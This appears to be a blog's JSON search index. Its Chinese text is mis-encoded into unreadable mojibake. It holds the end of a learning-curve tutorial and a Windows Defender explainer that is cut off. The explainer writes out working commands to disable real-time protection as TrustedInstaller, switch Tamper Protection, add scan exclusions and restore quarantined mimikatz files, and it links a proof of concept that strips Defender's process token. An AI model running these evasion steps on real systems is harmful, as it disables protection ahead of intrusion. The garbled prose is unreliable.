ï¼Œä¸”è¯¥éªŒè¯é›†ä¸Šçš„è¯¯å·®ä¹Ÿä¸ä¼šä¸‹é™ã€‚æ‰€ä»¥ï¼Œå€˜è‹¥è¯¯å·®ã€Œæ”¶æ•›ã€ï¼Œå¦‚æœä¸æ”¹å˜æ¨¡å‹çš„å¤æ‚åº¦ï¼Œè€Œæ˜¯ä»…ä»…æŠŠæ•°æ®é›†å¤§å°å¢å¤§ 10 å€ï¼Œæˆ–è®¸å¯¹æœ€ç»ˆçš„è¡¨ç°ç»“æœæ²¡æœ‰å¤ªå¤§å¸®åŠ©ã€‚ å¦‚æœå°†æ­£åˆ™åŒ–ç³»æ•° alpha é™ä½åˆ° 0.05ï¼Œä¼šæ€ä¹ˆæ ·ï¼Ÿ 1plot_learning_curve(degree=2, alpha=0.05) ä¸Šå›¾è¡¨æ˜ï¼Œé™ä½æ­£åˆ™åŒ–ç³»æ•° alpha è‡³ 0.05ï¼Œæ›²çº¿å°†é€æ¸æ”¶æ•›ï¼Œå¦‚æœåŠ å…¥æ›´å¤šæ•°æ®ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ”¹å–„æ¨¡å‹åœ¨éªŒè¯é›†ä¸Šçš„è¡¨ç°ã€‚ å¦‚æœæŠŠ alpha è®¾ä¸º 10âˆ’410^{-4}10âˆ’4ï¼Œè®©æ¨¡å‹æ›´å¤æ‚ï¼Œä¼šå‡ºç°ä»€ä¹ˆæƒ…å†µï¼Ÿ 1plot_learning_curve(degree=2, alpha=1e-4) ä¸Šå›¾è¡¨æ˜ï¼Œä¸æ­£åˆ™åŒ–ç³»æ•° alpha=0.05 ç›¸æ¯”ï¼Œåœ¨è®­ç»ƒé›†å’ŒéªŒè¯é›†ä¸Šï¼ŒAUC éƒ½ä¸‹é™äº†ï¼Œå‡ºç°è¿‡æ‹Ÿåˆç°è±¡ã€‚ æ„å»ºå­¦ä¹ æ›²çº¿å’ŒéªŒè¯æ›²çº¿å¯ä»¥å¸®åŠ©æˆ‘ä»¬ä¸ºæ–°æ•°æ®è°ƒæ•´åˆé€‚çš„æ¨¡å‹å¤æ‚åº¦ã€‚ å…³äºéªŒè¯æ›²çº¿å’Œå­¦ä¹ æ›²çº¿çš„ç»“è®ºï¼š è®­ç»ƒé›†ä¸Šçš„è¯¯å·®æœ¬èº«ä¸èƒ½è¯´æ˜æ¨¡å‹çš„è´¨é‡ã€‚ äº¤å‰éªŒè¯è¯¯å·®é™¤äº†å¯ä»¥æ˜¾ç¤ºæ¨¡å‹å¯¹æ•°æ®çš„æ‹Ÿåˆç¨‹åº¦å¤–ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºæ¨¡å‹ä¿ç•™äº†å¤šå°‘å¯¹æ–°æ•°æ®çš„æ¦‚æ‹¬èƒ½åŠ›ã€‚ éªŒè¯æ›²çº¿æ˜¯ä¸€æ¡æ ¹æ®æ¨¡å‹å¤æ‚åº¦æ˜¾ç¤ºè®­ç»ƒé›†å’ŒéªŒè¯é›†ç»“æœçš„æ›²çº¿ï¼šå¦‚æœä¸¤æ¡æ›²çº¿å½¼æ­¤æ¥è¿‘ï¼Œä¸”ä¸¤è€…çš„è¯¯å·®éƒ½å¾ˆå¤§ï¼Œè¿™æ ‡å¿—ç€æ¬ æ‹Ÿåˆï¼›å¦‚æœä¸¤æ¡æ›²çº¿å½¼æ­¤è·ç¦»å¾ˆè¿œï¼Œè¿™æ ‡å¿—ç€è¿‡æ‹Ÿåˆã€‚ å­¦ä¹ æ›²çº¿æ˜¯ä¸€ä¸ªæ ¹æ®è§‚æµ‹æ•°é‡æ˜¾ç¤ºè®­ç»ƒé›†å’ŒéªŒè¯é›†ç»“æœçš„æ›²çº¿ï¼šå¦‚æœä¸¤æ¡æ›²çº¿æ”¶æ•›ï¼Œé‚£ä¹ˆå¢åŠ æ–°æ•°æ®æ”¶ç›Šä¸å¤§ï¼Œæœ‰å¿…è¦æ”¹å˜æ¨¡å‹å¤æ‚åº¦ï¼›å¦‚æœä¸¤æ¡æ›²çº¿æ²¡æœ‰æ”¶æ•›ï¼Œå¢åŠ æ–°æ•°æ®å¯ä»¥æ”¹å–„ç»“æœã€‚ å®éªŒæ€»ç»“ æœ¬æ¬¡å®éªŒä¸»è¦ä½¿ç”¨é€»è¾‘å›å½’çš„æ–¹æ³•æ„å»ºçº¿æ€§å›å½’å’Œçº¿æ€§åˆ†ç±»æ¨¡å‹ï¼Œæ­£åˆ™åŒ–ã€éªŒè¯æ›²çº¿ã€å­¦ä¹ æ›²çº¿æ–¹æ³•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½æ›´å¿«çš„æ„å»ºæ¨¡å‹ã€‚ ç›¸å…³é“¾æ¥ ã€Šæ·±åº¦å­¦ä¹ ã€‹. scikit-learn æ–‡æ¡£ scikit-learn æŒ‡å— é€‚åˆçº¿æ€§å›å½’å’Œé€»è¾‘å›å½’çš„æœºå™¨å­¦ä¹ ç®—æ³•å®ç° äº†è§£è“æ¡¥äº‘è¯¾ã€Šæ¥¼+ æœºå™¨å­¦ä¹ å’Œæ•°æ®æŒ–æ˜è¯¾ç¨‹ã€‹","tags":[{"name":"å®éªŒæ¥¼","slug":"å®éªŒæ¥¼","permalink":"https://hodlyounger.github.io/tags/%E5%AE%9E%E9%AA%8C%E6%A5%BC/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"machine-learning","slug":"machine-learning","permalink":"https://hodlyounger.github.io/tags/machine-learning/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"C_æœºå™¨å­¦ä¹ ","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ åŸºç¡€","slug":"A-å†…åŠŸ/C-æœºå™¨å­¦ä¹ /æœºå™¨å­¦ä¹ åŸºç¡€","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/C-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80/"}]},{"title":"Windows Defender ç›¸å…³æ–‡ç« æ¨è","date":"2024-06-17T02:01:54.502Z","path":"A_OS/Windows/Defender/Defender/","text":"æ¦‚è¿°ï¼šWindows Defenderã€Microsoft Malware Protection Engine ç›¸å…³æŠ€æœ¯æ–‡ç« æ¨è ã€Œæ”»é˜²å¯¹æŠ—ã€Windows Defender | å¼±ç‚¹åˆ†æä¸æ— æ„Ÿç»•è¿‡ç­–ç•¥ - æŠ€æœ¯è½¬è½½ å®‰å…¨çŸ©é˜µ","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Defender","slug":"A-OS/Windows/Defender","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Defender/"}]},{"title":"ã€WINã€‘Windows Defenderè¯¦è§£","date":"2024-06-16T16:00:00.000Z","path":"A_OS/Windows/Defender/ã€WINã€‘Windows Defenderè¯¦è§£/","text":"æ¦‚è¿°ï¼šWindows MSMPEng ä½ å¯èƒ½ä¸å¤ªç†Ÿæ‚‰ï¼Œä½†æ˜¯ Windows Defender ä½ è‚¯å®šè§è¿‡æˆ–æ˜¯ç”¨è¿‡ã€‚æœ¬æ–‡å°± Windows Defender çš„ç›¸å…³å†…å®¹è¿›è¡Œæ•´ç†è®°å½•ã€‚ ç›¸å…³æ¨èï¼š ã€Œæ”»é˜²å¯¹æŠ—ã€Windows Defender | å¼±ç‚¹åˆ†æä¸æ— æ„Ÿç»•è¿‡ç­–ç•¥ - æŠ€æœ¯è½¬è½½ å®‰å…¨çŸ©é˜µ æ–‡ç« ç»“æ„ï¼š [toc] 0x01 Windows Defender æ˜¯ä»€ä¹ˆ Windows Defender æ˜¯ä¸€æ¬¾å†…ç½®åœ¨ Windows æ“ä½œç³»ç»Ÿçš„é˜²ç—…æ¯’è½¯ä»¶ç¨‹åºã€‚å¾®è½¯å®˜æ–¹åŒæ—¶æä¾›äº†å•†ä¸šç‰ˆç‰ˆæœ¬ã€‚åœ¨å…¶æè¿°ä¸­æåˆ°å…¶ç»“åˆäº†æœºå™¨å­¦ä¹ ã€å¤§æ•°æ®åˆ†æã€æ·±åº¦å¨èƒæŠµå¾¡ç ”ç©¶å’Œ Microsoft äº‘æŠ€æœ¯ç»“æ„ç­‰æŠ€æœ¯ã€‚ 0x02 Defender é˜²ç—…æ¯’è¿‡ç¨‹å’ŒæœåŠ¡ è¿›ç¨‹æˆ–æœåŠ¡ æŸ¥çœ‹å…¶çŠ¶æ€çš„ä½ç½® Microsoft Defender é˜²ç—…æ¯’æ ¸å¿ƒæœåŠ¡ (MdCoreSvc) - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šAntimalware Core Service - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š MpDefenderCoreService.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šMicrosoft Defender Core Service Microsoft Defender é˜²ç—…æ¯’æœåŠ¡ (WinDefend) - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šAntimalware Service Executable - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š MsMpEng.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šMicrosoft Defender Antivirus Microsoft Defender é˜²ç—…æ¯’ç½‘ç»œå®æ—¶æ£€æŸ¥æœåŠ¡ (WdNisSvc) - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šMicrosoft Network Realtime Inspection Service - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š NisSrv.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šMicrosoft Defender Antivirus Network Inspection Service Microsoft Defender é˜²ç—…æ¯’å‘½ä»¤è¡Œå®ç”¨å·¥å…· - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š MpCmdRun.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ Microsoft å®‰å…¨å®¢æˆ·ç«¯ç­–ç•¥é…ç½®å·¥å…· - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š ConfigSecurityPolicy.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ è‹¥è¦äº†è§£æœ‰å…³ Microsoft Defender Core æœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—® Microsoft Defender Core æœåŠ¡æ¦‚è¿°ã€‚ å¯¹äº Microsoft Endpoint æ•°æ®ä¸¢å¤±é˜²æŠ¤ (Endpoint DLP) ï¼Œä¸‹è¡¨æ±‡æ€»äº†è¿›ç¨‹å’ŒæœåŠ¡ã€‚ å¯ä»¥åœ¨ Windows çš„ä»»åŠ¡ç®¡ç†å™¨ä¸­æŸ¥çœ‹å®ƒä»¬ã€‚ è¿›ç¨‹æˆ–æœåŠ¡ æŸ¥çœ‹å…¶çŠ¶æ€çš„ä½ç½® Microsoft Endpoint DLP æœåŠ¡ (MDDlpSvc) - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šMpDlpService.exe - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š MpDlpService.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šMicrosoft Data Loss Prevention Service Microsoft Endpoint DLP å‘½ä»¤è¡Œå®ç”¨å·¥å…· - â€œè¿›ç¨‹â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ - â€œè¯¦ç»†ä¿¡æ¯ â€é€‰é¡¹å¡ï¼š MpDlpCmd.exe - â€œæœåŠ¡â€é€‰é¡¹å¡ï¼šâ€œä¸é€‚ç”¨â€ æ¯”è¾ƒä¸»åŠ¨æ¨¡å¼ã€è¢«åŠ¨æ¨¡å¼å’Œå·²ç¦ç”¨æ¨¡å¼ ä¸‹è¡¨ä»‹ç»äº† Microsoft Defender é˜²ç—…æ¯’å¤„äºä¸»åŠ¨æ¨¡å¼ã€è¢«åŠ¨æ¨¡å¼æˆ–å·²ç¦ç”¨æ¨¡å¼ä¸‹åº”å‘ç”Ÿçš„æƒ…å†µã€‚ å±•å¼€è¡¨ æ¨¡å¼ å‘ç”Ÿçš„æƒ…å†µ ä¸»åŠ¨æ¨¡å¼ åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼ŒMicrosoft Defender é˜²ç—…æ¯’ç”¨ä½œè®¾å¤‡ä¸Šçš„ä¸»é˜²ç—…æ¯’åº”ç”¨ã€‚ å°†æ‰«ææ–‡ä»¶ï¼Œä¿®æ­£å¨èƒï¼Œå¹¶å°†æ£€æµ‹åˆ°çš„å¨èƒåˆ—åœ¨ç»„ç»‡çš„å®‰å…¨æŠ¥å‘Šä¸­å’Œ Windows å®‰å…¨ä¸­å¿ƒåº”ç”¨ä¸­ã€‚ è¢«åŠ¨æ¨¡å¼ åœ¨è¢«åŠ¨æ¨¡å¼ä¸‹ï¼Œä¸å°† Microsoft Defender é˜²ç—…æ¯’ç”¨ä½œè®¾å¤‡ä¸Šçš„ä¸»é˜²ç—…æ¯’åº”ç”¨ã€‚ å°†æ‰«ææ–‡ä»¶ï¼Œå¹¶æŠ¥å‘Šæ£€æµ‹åˆ°çš„å¨èƒï¼Œä½† Microsoft Defender é˜²ç—…æ¯’ä¸ä¼šä¿®æ­£å¨èƒã€‚ é‡è¦ï¼š Microsoft Defender é˜²ç—…æ¯’åªèƒ½åœ¨è½½å…¥åˆ° Microsoft Defender for Endpoint çš„ç»ˆç»“ç‚¹ä¸Šä»¥è¢«åŠ¨æ¨¡å¼è¿è¡Œã€‚ è¯·å‚é˜… åœ¨è¢«åŠ¨æ¨¡å¼ä¸­è¿è¡ŒMicrosoft Defender é˜²ç—…æ¯’çš„è¦æ±‚ã€‚ å·²ç¦ç”¨æˆ–å¸è½½ åœ¨å·²ç¦ç”¨æˆ–å¸è½½æ—¶ï¼Œä¸ä½¿ç”¨ Microsoft Defender é˜²ç—…æ¯’ã€‚ ä¸ä¼šæ‰«ææ–‡ä»¶ï¼Œå¹¶ä¸”ä¸ä¼šä¿®æ­£å¨èƒã€‚ é€šå¸¸ï¼Œæˆ‘ä»¬ä¸å»ºè®®ç¦ç”¨æˆ–å¸è½½ Microsoft Defender é˜²ç—…æ¯’ã€‚ è¦äº†è§£è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Microsoft Defender é˜²ç—…æ¯’ã€‚ 0x3 æŸ¥çœ‹ Defender å†…å®¹ æŸ¥çœ‹ Defender çŠ¶æ€ ä½¿ç”¨ Windows å®‰å…¨ä¸­å¿ƒåº”ç”¨æ£€æŸ¥ Microsoft Defender é˜²ç—…æ¯’è½¯ä»¶çŠ¶æ€ åœ¨ Windows è®¾å¤‡ä¸Šï¼Œé€‰æ‹©â€œå¼€å§‹â€èœå•ï¼Œç„¶åå¼€å§‹é”®å…¥ Securityã€‚ ç„¶ååœ¨ç»“æœä¸­æ‰“å¼€ Windows å®‰å…¨ä¸­å¿ƒåº”ç”¨ã€‚ é€‰æ‹©â€œç—…æ¯’å’Œå¨èƒé˜²æŠ¤â€ã€‚ åœ¨â€œè°åœ¨ä¿æŠ¤æˆ‘ï¼Ÿâ€ä¸‹ï¼Œé€‰æ‹©â€œç®¡ç†æä¾›ç¨‹åºâ€ã€‚ å®‰å…¨æä¾›ç¨‹åºé¡µé¢ä¸Šå°†æ˜¾ç¤ºé˜²ç—…æ¯’/åæ¶æ„è½¯ä»¶è§£å†³æ–¹æ¡ˆçš„åç§°ã€‚ ä½¿ç”¨ PowerShell æ£€æŸ¥ Microsoft Defender é˜²ç—…æ¯’è½¯ä»¶çŠ¶æ€ é€‰æ‹©â€œå¼€å§‹â€èœå•ï¼Œç„¶åå¼€å§‹é”®å…¥ PowerShellã€‚ ç„¶ååœ¨ç»“æœä¸­æ‰“å¼€ Windows PowerShellã€‚ ç±»å‹ Get-MpComputerStatusã€‚ åœ¨ç»“æœåˆ—è¡¨ä¸­ï¼ŒæŸ¥çœ‹ AMRunningMode è¡Œã€‚ æ­£å¸¸ è¡¨ç¤º Microsoft Defender é˜²ç—…æ¯’åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹è¿è¡Œã€‚ è¢«åŠ¨æ¨¡å¼ è¡¨ç¤º Microsoft Defender é˜²ç—…æ¯’æ­£åœ¨è¿è¡Œï¼Œä½†ä¸æ˜¯è®¾å¤‡ä¸Šçš„ä¸»è¦é˜²ç—…æ¯’/åæ¶æ„è½¯ä»¶äº§å“ã€‚ è¢«åŠ¨æ¨¡å¼ä»…é€‚ç”¨äºå·²è½½å…¥ Microsoft Defender for Endpoint ä¸”æ»¡è¶³ç‰¹å®šè¦æ±‚çš„è®¾å¤‡ã€‚ è‹¥è¦äº†è§£è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Microsoft Defender é˜²ç—…æ¯’åœ¨è¢«åŠ¨æ¨¡å¼è¿è¡Œçš„è¦æ±‚ã€‚ EDR é˜»æ­¢æ¨¡å¼ æ„å‘³ç€Microsoft Defender é˜²ç—…æ¯’æ­£åœ¨è¿è¡Œï¼Œå¹¶ä¸”åœ¨é˜»æ­¢æ¨¡å¼ä¸‹ ç»ˆç»“ç‚¹æ£€æµ‹å’Œå“åº” ï¼ˆEDRï¼‰ï¼Œï¼ˆMicrosoft Defender for Endpoint ä¸­çš„åŠŸèƒ½ï¼‰å·²å¯ç”¨ã€‚ æ£€æŸ¥ ForceDefenderPassiveMode æ³¨å†Œè¡¨é¡¹ã€‚ å¦‚æœå…¶å€¼ä¸º 0ï¼Œåˆ™è¡¨ç¤ºå®ƒåœ¨æ­£å¸¸æ¨¡å¼ä¸‹è¿è¡Œ;å¦åˆ™ï¼Œå®ƒå°†åœ¨è¢«åŠ¨æ¨¡å¼ä¸‹è¿è¡Œã€‚ SxS è¢«åŠ¨æ¨¡å¼ æ„å‘³ç€ Microsoft Defender é˜²ç—…æ¯’ä¸å¦ä¸€ä¸ªé˜²ç—…æ¯’/åæ¶æ„è½¯ä»¶äº§å“ä¸€èµ·è¿è¡Œï¼Œå¹¶ä¸” ä½¿ç”¨æœ‰é™çš„å®šæœŸæ‰«æã€‚ ä½¿ç”¨ CMD å‘½ä»¤è¡ŒæŸ¥çœ‹ 123456dir &quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\&quot; /od /ad /b----4.18.23090.2008-04.18.24030.9-04.18.24040.4-04.18.24050.7-0 æ•°å­—å¤§çš„ä¸ºæœ€æ–°ç‰ˆæœ¬ã€‚ æŸ¥çœ‹å·²å­˜åœ¨çš„æŸ¥æ€æ’é™¤åˆ—è¡¨ é€šè¿‡é¢æ¿æŸ¥çœ‹ ![Alt text]([WIN] Windows Defenderè¯¦è§£/1-2.png) é€šè¿‡å‘½ä»¤è¡ŒæŸ¥çœ‹ 1reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions&quot; /s é€šè¿‡ Powershell æŸ¥çœ‹ 1Get-MpPreference | select ExclusionPath 0x04 å…³é—­ Windows Defender çš„ Real-time Protection é€šè¿‡é¢æ¿å…³é—­ ä¾æ¬¡é€‰æ‹©Windows Security-&gt;Virus &amp; theat protection settingsï¼Œå…³é—­Real-time protection é€šè¿‡å‘½ä»¤è¡Œå…³é—­ åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦ TrustedInstaller æƒé™ éœ€è¦å…³é—­ Tamer Protection 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection&quot; /v &quot;DisableRealtimeMonitoring&quot; /d 1 /t REG_DWORD /f è¿è¡ŒæˆåŠŸæƒ…å†µä¸‹ï¼Œç³»ç»Ÿå¼¹çª—ä¼šæç¤º Windows Defender å·²å…³é—­ ğŸ’¡è¡¥å……ï¼š å¼€å¯ Windows Defender çš„ Real-time protection åˆ©ç”¨æ¡ä»¶ï¼šåŒå…³é—­æ—¶åˆ©ç”¨æ¡ä»¶ 1reg delete &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection&quot; /v &quot;DisableRealtimeMonitoring&quot; /f ğŸ’¡è¡¥å……2ï¼šå¦‚æœè·å– TrustedInstaller æƒé™ å¯ä»¥ä½¿ç”¨ TokenVator å°† system æƒé™æå‡è‡³ TrustedInstaller æƒé™ ä¹Ÿå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  æˆ–è€…ä½¿ç”¨ AdvancedRunï¼Œå‘½ä»¤ç¤ºä¾‹ï¼š 1AdvancedRun.exe /EXEFilename &quot;%windir%\\system32\\cmd.exe&quot; /CommandLine &#x27;/c reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection&quot; /v &quot;DisableRealtimeMonitoring&quot; /d 1 /t REG_DWORD /f&#x27; /RunAs 8 /Run ğŸ’¡è¡¥å……3ï¼š Tamper Protection å‚è€ƒèµ„æ–™ï¼š https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide å½“å¼€å¯ Tamper Protection æ—¶ï¼Œç”¨æˆ·å°†æ— æ³•é€šè¿‡æ³¨å†Œè¡¨ã€Powershell å’Œç»„ç­–ç•¥ä¿®æ”¹ Windows Defender çš„é…ç½® å¼€å¯ Tamper Protectionçš„æ–¹æ³•ï¼š ä¾æ¬¡é€‰æ‹©Windows Security-&gt;Virus &amp; theat protection settingsï¼Œå¯ç”¨Tamper Protection 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Features&quot; /v &quot;TamperProtection&quot; /d 5 /t REG_DWORD /f å…³é—­ Tamper Protection çš„æ–¹æ³• ä¾æ¬¡é€‰æ‹©Windows Security-&gt;Virus &amp; theat protection settingsï¼Œç¦ç”¨Tamper Protection 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Features&quot; /v &quot;TamperProtection&quot; /d 4 /t REG_DWORD /f æ³¨æ„ï¼šæ— æ³•é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å»è®¾ç½® Tamper Protectionï¼Œåªèƒ½é€šè¿‡é¢æ¿å»ä¿®æ”¹ æŸ¥çœ‹ Tamper Protection çš„çŠ¶æ€ 1reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Features&quot; /v &quot;TamperProtection&quot; è¿”å›ç»“æœè¯´æ˜ï¼š 5ï¼šå¼€å¯ï¼›4ï¼šå…³é—­ ğŸ’¡è¡¥å……4ï¼šé€šè¿‡ Powershell å…³é—­ Windows Defender çš„ Real-time protection 1Set-MpPreferecve -DisableRealtimeMonitoring $true æ³¨ï¼šæ–°ç‰ˆæœ¬çš„Windowså·²ç»ä¸å†é€‚ç”¨ ğŸ’¡è¡¥å……5ï¼š é€šè¿‡ç»„ç­–ç•¥å…³é—­ Windows Defender çš„Real-time protection ä¾æ¬¡æ‰“å¼€gpedit.msc-&gt;Computer Configuration-&gt;Administrative Templates-&gt;Windows Components-&gt;Microsoft Defender Antivirus-&gt;Real-time Protectionï¼Œé€‰æ‹©Turn off real-time protectionï¼Œé…ç½®æˆEnable æ³¨ï¼šæ–°ç‰ˆæœ¬çš„Windowså·²ç»ä¸å†é€‚ç”¨ 0x05 æ·»åŠ æŸ¥æ€æ’é™¤åˆ—è¡¨ é€šè¿‡é¢æ¿æ·»åŠ  ä¾æ¬¡é€‰æ‹©Windows Security-&gt;Virus &amp; theat protection settings-&gt;Add or remove exclusionsï¼Œé€‰æ‹©Add an exclusionï¼ŒæŒ‡å®šç±»å‹ è¯¥æ“ä½œç­‰ä»·äºä¿®æ”¹æ³¨å†Œè¡¨HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\çš„é”®å€¼ï¼Œå…·ä½“ä½ç½®å¦‚ä¸‹ï¼š ç±»å‹Fileå¯¹åº”æ³¨å†Œè¡¨é¡¹Paths ç±»å‹Folderå¯¹åº”æ³¨å†Œè¡¨é¡¹Paths ç±»å‹File typeå¯¹åº”æ³¨å†Œè¡¨é¡¹Extensions ç±»å‹Processå¯¹åº”æ³¨å†Œè¡¨é¡¹Processes é€šè¿‡å‘½ä»¤è¡Œæ·»åŠ  åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦TrustedInstalleræƒé™ cmdå‘½ä»¤ç¤ºä¾‹ï¼š 1reg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths&quot; /v &quot;c:\\test&quot; /d 0 /t REG_DWORD /f 3.é€šè¿‡Powershellæ·»åŠ  åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦ç®¡ç†å‘˜æƒé™ å‚è€ƒèµ„æ–™ï¼š https://docs.microsoft.com/en-us/powershell/module/defender/add-mppreference?view=windowsserver2022-ps Powershellå‘½ä»¤ç¤ºä¾‹ï¼š 1Add-MpPreference -ExclusionPath &quot;C:\\test&quot; è¡¥å……ï¼šåˆ é™¤æ’é™¤åˆ—è¡¨ 1Remove-MpPreference -ExclusionPath &quot;C:\\test&quot; 0x06 ç§»é™¤ Token å¯¼è‡´ Windows Defender å¤±æ•ˆ å­¦ä¹ åœ°å€ï¼š https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/ ç®€å•ç†è§£ï¼š Windows Defenderè¿›ç¨‹ä¸ºMsMpEng.exe MsMpEng.exeæ˜¯ä¸€ä¸ªå—ä¿æŠ¤çš„è¿›ç¨‹(Protected Process Lightï¼Œç®€å†™ä¸ºPPL) éPPLè¿›ç¨‹æ— æ³•è·å–PPLè¿›ç¨‹çš„å¥æŸ„ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•ç›´æ¥ç»“æŸPPLè¿›ç¨‹MsMpEng.exe ä½†æ˜¯æˆ‘ä»¬èƒ½å¤Ÿä»¥SYSTEMæƒé™è¿è¡Œçš„çº¿ç¨‹ä¿®æ”¹è¿›ç¨‹MsMpEng.exeçš„token å½“æˆ‘ä»¬ç§»é™¤è¿›ç¨‹MsMpEng.exeçš„æ‰€æœ‰tokenåï¼Œè¿›ç¨‹MsMpEng.exeæ— æ³•è®¿é—®å…¶ä»–è¿›ç¨‹çš„èµ„æºï¼Œä¹Ÿå°±æ— æ³•æ£€æµ‹å…¶ä»–è¿›ç¨‹æ˜¯å¦æœ‰å®³ï¼Œæœ€ç»ˆå¯¼è‡´Windows Defenderå¤±æ•ˆ POCåœ°å€ï¼šhttps://github.com/pwn1sher/KillDefender åˆ©ç”¨æ¡ä»¶ï¼š éœ€è¦Systemæƒé™ 0x07 æ¢å¤è¢«éš”ç¦»çš„æ–‡ä»¶ å‚è€ƒèµ„æ–™ï¼š https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide 1.å®šä½MpCmdRun 1dir &quot;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\&quot; /od /ad /b å¾—åˆ°&lt;antimalware platform version&gt; MpCmdRunçš„ä½ç½®ä¸ºï¼šC:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\&lt;antimalware platform version&gt; 2.å¸¸ç”¨å‘½ä»¤ æŸ¥çœ‹è¢«éš”ç¦»çš„æ–‡ä»¶åˆ—è¡¨ï¼š 1MpCmdRun -Restore -ListAll æ¢å¤æŒ‡å®šåç§°çš„æ–‡ä»¶è‡³åŸç›®å½•ï¼š 1MpCmdRun -Restore -FilePath C:\\test\\mimikatz_trunk.zip æ¢å¤æ‰€æœ‰æ–‡ä»¶è‡³åŸç›®å½•ï¼š 1MpCmdRun -Restore -All æŸ¥çœ‹æŒ‡å®šè·¯å¾„æ˜¯å¦ä½äºæ’é™¤åˆ—è¡¨ä¸­ï¼š 1MpCmdRun -CheckExclusion -path C:\\test è¡¥å……ï¼Œå¦‚æœä½ çš„ Windows ä¸Šå®‰è£…äº†åˆ«çš„å®‰å…¨è½¯ä»¶ï¼Œåˆ™ä¼šå‡ºç° Windows Defender æœªå¯åŠ¨çš„æƒ…å†µï¼Œè¿™æ—¶å€™å†è¿è¡Œ MpCmdRun æ˜¯æ— æ•ˆçš„ï¼Œä¼šæŠ¥é”™ 0x800106baã€‚ 0x08 é˜²å¾¡å»ºè®® é˜»æ­¢é€šè¿‡å‘½ä»¤è¡Œå…³é—­Windows Defenderï¼šå¼€å¯Tamper Protection é˜»æ­¢é€šè¿‡ç§»é™¤Tokenå¯¼è‡´Windows 